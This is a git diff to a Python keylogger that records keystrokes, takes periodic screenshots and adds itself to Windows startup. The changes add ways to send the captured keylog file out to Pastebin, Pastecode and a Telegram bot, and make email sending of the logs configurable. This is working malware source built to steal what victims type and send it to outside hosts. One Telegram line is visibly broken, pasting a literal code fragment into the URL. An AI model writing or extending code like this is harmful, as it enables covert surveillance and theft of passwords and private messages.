@@ -29,7 +29,7 @@
 #                   * Paste data to a Paste service/site (to do)
 #
 # Required:         Install with "pip install module-name-required"
-#                   pywin32, pyWinhook, win32gui, requests, wxPython, urllib2
+#                   pywin32, pyWinhook, win32gui, requests, wxPython, urllib2, python-telegram-bot
 #                   This list could be incomplete.
 #                   Install the necessary modules that are requested when executing the program.
 #
@@ -116,7 +116,7 @@ ENCODING = 'utf-8'
 # GLOBAL VARIABLES
 ########################################################
 
-# key counter : Future use. At the moment without utility.
+# key counter
 key_counter = 0
 
 # Previous event control. Used to detect when the user changes the window or application.
@@ -344,57 +344,62 @@ def load_file(file_name):
 
 
 # Sends keylogger file to a paste service
-# https://pastebin.com/api
-# https://pastecode.xyz/api
-# https://pastecode.xyz/api/create
-#       text=[your paste text]
-#       title=[title]
-#       name=[name]
-#       private=1
-#       lang=[language] -> lang=text
-#       expire=[minutes]
-# parameters:   file_name   :   full path of file to send
-#               service     :   1 - pastebin
+# : file_name = full path of file to send
+# : service = 1 => Pastebin      https://pastebin.com/api        example: https://pastebin.com/tW4Z2KXG
+# : service = 2 => Pastecode     https://pastecode.xyz/api       example: https://pastecode.xyz/view/722cfc48
+# : service = 3 => Telegram Bot  https://core.telegram.org/bots/api
 def paste_file(file_name, service):
-    if service == 1:                # Pastebin
-        paste_service_url = 'https://pastebin.com/api/api_post.php'     # Post url
-        paste_dev_key = config.PASTEBIN_API_DEV_KEY                     # Our dev key (see config.py)
-        paste_option = 'paste'
-        paste_format = 'text'
-        paste_private = 2                           # Pastebin : public = 0, unlisted = 1, private = 2
-        paste_expire_date = '6M'                    # 6 Months
-        paste_name = APPNAME + ' ' + file_name
-        paste_code = load_file(file_name)
+    paste_service_url = ""
+    paste_params = {}
+    url_file_pasted = ""
+    if service == config.PASTE_PASTEBIN and config.PASTEBIN_ENABLED:        # Pastebin
+        paste_service_url = config.PASTEBIN_POST_URL                        # Post url
         # Create parameters structure
-        paste_params = {'api_dev_key': paste_dev_key,           # the first three params are required
-                        'api_option': paste_option,
-                        'api_paste_code': paste_code,
-                        'api_paste_name': paste_name,           # from here they are optional
-                        'api_paste_format': paste_format,
-                        'api_paste_private': paste_private,
-                        'api_paste_expire_date': paste_expire_date
+        paste_params = {'api_dev_key': str(config.PASTEBIN_API_DEV_KEY),    # Our dev key (see config.py)
+                        'api_option': str(config.PASTEBIN_OPTION),
+                        'api_paste_code': str(load_file(file_name)),
+                        'api_paste_name': str(APPNAME + ' ' + file_name),
+                        'api_paste_format': str(config.PASTEBIN_FORMAT),
+                        'api_paste_private': int(config.PASTEBIN_PRIVATE),
+                        'api_paste_expire_date': str(config.PASTEBIN_POST_EXPIRE)
                         }
+        # If not set user and pass an anonymous paste is made
+        if config.PASTEBIN_USER_NAME is not "":
+            paste_params['api_user_name'] = str(config.PASTEBIN_USER_NAME)
+            paste_params['api_user_password'] = str(config.PASTEBIN_PASSWORD)
 
-        logging.debug('Parametros a enviar {}'.format(paste_params))
-        #data_encoded = urllib.urlencode(paste_params)           # encode data
-        data_encoded = urllib.parse.quote(bytes(paste_params, ENCODING))          # encode data
+        logging.info('Pastebin envia: {}'.format(paste_params))
+    elif service == config.PASTE_PASTECODE and config.PASTECODE_ENABLED:    # Pastecode
+        paste_service_url = config.PASTECODE_POST_URL                       # Post url
+        # Create parameters structure
+        paste_params = {'text': str(load_file(file_name)),
+                        'title': str(file_name),
+                        'name': str(APPNAME),
+                        'private': config.PASTECODE_PRIVATE,                # 1 = private
+                        'language': config.PASTECODE_POST_FORMAT,
+                        'expire': config.PASTECODE_POST_EXPIRE
+                        }
+        logging.info('Pastecode envia: {}'.format(paste_params))
+    elif service == config.PASTE_TELEGRAM and config.TELEGRAM_BOT_ENABLED:  # Telegram Bot
+        paste_params = {}
+        paste_service_url = config.TELEGRAM_BOT_POST_URL + '&text=str(load_file(file_name)'
+        logging.info('Telegram Bot envia: {}'.format(paste_service_url))
+    else:
+        logging.debug('No esta activado ningun servicio de Paste')
+
+    if paste_service_url is not "":
+        # Encode data
+        data_encoded = urllib.parse.urlencode(paste_params)
+        data_encoded = data_encoded.encode(ENCODING)
         logging.debug('Parametros codificados {}'.format(data_encoded))
 
         # HTTP post request
-        request = urllib.request(paste_service_url, data_encoded)
-        logging.debug('Respuesta recibida en HTTP request {}'.format(request))
+        req = urllib.request.urlopen(paste_service_url, data_encoded)
 
         # Get url of file pasted from API response
-        response = urllib.urlopen(request)
-        logging.debug('URL {}'.format(response))
-        url_file_pasted = response.read()
-    elif service == 2:              # Pastecode
-        url_file_pasted = ""
-        pass
-    else:
-        url_file_pasted = ""
+        url_file_pasted = req.read().decode(ENCODING)
+        logging.debug('URL of Paste {}'.format(url_file_pasted))
 
-    # TODO: Implementation Paste File
     return url_file_pasted
 
 
@@ -411,6 +416,9 @@ def add_keylogger_to_startup():
 
 # Mail info send
 def send_email(message):
+    if not config.SEND_EMAIL_ENABLED:
+        return
+
     try:
         # Configuration data
         email_from_addr = config.SEND_EMAIL_FROM
@@ -418,9 +426,11 @@ def send_email(message):
         email_username = config.SEND_EMAIL_USERNAME
         email_password = config.SEND_EMAIL_PASSWORD
 
-        # Sendind mail
-        server_mail: SMTP = smtplib.SMTP('smtp.gmail.com:587')
-        server_mail.starttls()
+        # Sending mail
+        smtp_server = config.SEND_EMAIL_SMTP + ':' + config.SEND_EMAIL_PORT
+        server_mail: SMTP = smtplib.SMTP(smtp_server)
+        if config.SEND_EMAIL_TLS:
+            server_mail.starttls()
         server_mail.login(email_username, email_password)
         server_mail.sendmail(email_from_addr, email_to_addrs, message)
 
@@ -496,9 +506,17 @@ def send_keylog_file(keylog_name):
     Opcionalmente hace envio por email para pruebas
     '''
     # Servicio Pastebin
-    logging.debug('Sending to pastebin...')
-    url_paste = paste_file(keylog_name, 1)
-    logging.info('pastebin url : {}'.format(url_paste))
+    logging.debug('Sending to Pastebin...')
+    url_paste = paste_file(keylog_name, config.PASTE_PASTEBIN)
+    logging.info('Pastebin url : {}'.format(url_paste))
+
+    logging.debug('Sending to Pastecode...')
+    url_paste = paste_file(keylog_name, config.PASTE_PASTECODE)
+    logging.info('Pastecode url : {}'.format(url_paste))
+
+    logging.debug('Sending to Telegram...')
+    url_paste = paste_file(keylog_name, config.PASTE_TELEGRAM)
+    logging.info('Pastecode url : {}'.format(url_paste))
 
     # Envia a Monitor
     # monitor_data_send()
@@ -560,7 +578,7 @@ def flush_key_buffer_to_disk():
 # Returns if a special key can be saved to the keylog
 def save_special_control_key(event):
     switcher = {
-        'TAB': True, 'LSHIFT': False, 'RSHIFT': False, 'CAPITAL': True, 'LCONTROL': True, 'RCONTROL': True,
+        'TAB': True, 'LSHIFT': False, 'RSHIFT': False, 'CAPITAL': False, 'LCONTROL': True, 'RCONTROL': True,
         'LMENU': True, 'RMENU': True, 'LWIN': False, 'RETURN': True, 'BACK': True, 'DELETE': True,
         'HOME': True, 'END': True, 'PRIOR': True, 'NEXT': True, 'ESCAPE': True
     }
@@ -593,7 +611,7 @@ def add_key_to_buffer(event):
     if len(ckey) > 0:
         key_counter += 1
         # If the counter is a multiple of args.keystoscreenshot, do a screenshot.
-        if (key_counter / args.keystoscreenshot) == (key_counter // args.keystoscreenshot):
+        if key_counter % args.keystoscreenshot == 0:
             capture_screen()
 
     # si buffer esta lleno lo vacia y envia el fichero en caso de ser necesario
@@ -645,8 +663,9 @@ def on_keyboard_event(event):
         msg = 'Transition: ' + repr(event.Transition)
         logging.debug(msg)
 
-        # If user change active window
-        if (old_event is None or event.WindowName != old_event.WindowName) and event.WindowName is not None:
+        # If user change active window or is the first time, saves Window Name
+        if old_event is None or event.WindowName != old_event.WindowName:
+            old_event = event
             register_window_name(repr(event.WindowName))
 
         # If especial key to close keylogger is pressed
